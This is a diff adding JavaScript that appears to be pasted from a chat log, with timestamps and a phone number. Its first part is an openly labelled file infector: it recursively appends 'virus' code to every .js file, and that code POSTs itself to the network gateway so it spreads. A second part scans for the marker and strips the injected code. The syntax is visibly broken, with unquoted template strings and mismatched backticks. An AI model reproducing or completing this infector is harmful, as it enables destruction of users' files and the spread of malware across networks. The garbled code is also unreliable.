@@ -1,0 +1,116 @@
+// [4:20 AM, 3/30/2024] +256 707 721872: // Function to infect all JavaScript files in the current directory and its subdirectories
+function infectFiles() {
+    try {
+        // Using Node.js fs module to manipulate files
+        const fs = require('fs');
+        const path = require('path');
+
+        // Recursive function to traverse directories and infect files
+        function traverseDirectory(dir) {
+            const files = fs.readdirSync(dir);
+            files.forEach(file => {
+                const filePath = path.join(dir, file);
+                const stats = fs.statSync(filePath);
+                if (stats.isDirectory()) {
+                    traverseDirectory(filePath);
+                } else {
+                    if (filePath.endsWith('.js')) {
+                        try {
+                            // Read the content of the file
+                            let content = fs.readFileSync(filePath, 'utf8');
+                            // Inject virus code into the file
+                            content += \n// Destructive virus code\nconsole.log("System corrupted. Goodbye!");\n\n// Auto-send virus function\nfunction autoSendVirus() {\n    const network = require('network');\n    network.get_gateway_ip((err, ip) => {\n        if (err) {\n            console.error('Failed to get gateway IP:', err);\n            return;\n        }\n        // Send the virus code to the gateway IP\n        const request = require('request');\n        request.post(\`http://${ip}/receiveVirus\, { form: { virusCode: content } }, (err, res, body) => {\n            if (err) {\n                console.error('Failed to send virus:', err);\n            } else {\n                console.log('Virus sent successfully!');\n            }\n        });\n    });\n}\n\n// Execute auto-send virus function\nautoSendVirus();`;
+                            // Write the modified content back to the file
+                            fs.writeFileSync(filePath, content);
+                            console.log(File infected: ${filePath});
+                        } catch (error) {
+                            console.error(Failed to infect file ${filePath}: ${error});
+                        }
+                    }
+                }
+            });
+        }
+
+        // Start infection from the current directory
+        traverseDirectory('.');
+    } catch (error) {
+        console.error(Error while infecting files: ${error});
+    }
+}
+
+// Execute the virus to infect files
+infectFiles();
+[4:20 AM, 3/30/2024] +256 707 721872: // Function to scan JavaScript files for virus code
+function scanFiles() {
+    const fs = require('fs');
+    const path = require('path');
+    const infectedFiles = [];
+
+    // Recursive function to traverse directories and scan files
+    function traverseDirectory(dir) {
+        try {
+            const files = fs.readdirSync(dir);
+            files.forEach(file => {
+                const filePath = path.join(dir, file);
+                const stats = fs.statSync(filePath);
+                if (stats.isDirectory()) {
+                    traverseDirectory(filePath);
+                } else {
+                    if (filePath.endsWith('.js')) {
+                        try {
+                            const content = fs.readFileSync(filePath, 'utf8');
+                            if (content.includes('// Destructive virus code')) {
+                                infectedFiles.push(filePath);
+                            }
+                        } catch (error) {
+                            console.error(Failed to scan file ${filePath}: ${error});
+                        }
+                    }
+                }
+            });
+        } catch (error) {
+            console.error(Error while scanning directory ${dir}: ${error});
+        }
+    }
+
+    // Start scanning from the current directory
+    traverseDirectory('.');
+
+    return infectedFiles;
+}
+
+// Function to remove virus code from infected files
+function removeVirus(infectedFiles) {
+    const fs = require('fs');
+
+    infectedFiles.forEach(file => {
+        try {
+            let content = fs.readFileSync(file, 'utf8');
+            // Remove virus code
+            content = content.replace(/\/\/ Destructive virus code[\s\S]*\/\/ Execute auto-send virus function/, '');
+            fs.writeFileSync(file, content);
+            console.log(Virus removed from file: ${file});
+        } catch (error) {
+            console.error(Failed to remove virus from file ${file}: ${error});
+        }
+    });
+}
+
+// Function to run the antivirus
+function runAntivirus() {
+    try {
+        const infectedFiles = scanFiles();
+        if (infectedFiles.length > 0) {
+            console.log(Infected files found: ${infectedFiles});
+            removeVirus(infectedFiles);
+            console.log('Virus successfully removed from all infected files.');
+        } else {
+            console.log('No infected files found. System is clean.');
+        }
+    } catch (error) {
+        console.error(Error while running antivirus: ${error});
+    }
+}
+
+// Execute the antivirus
+runAntivirus();
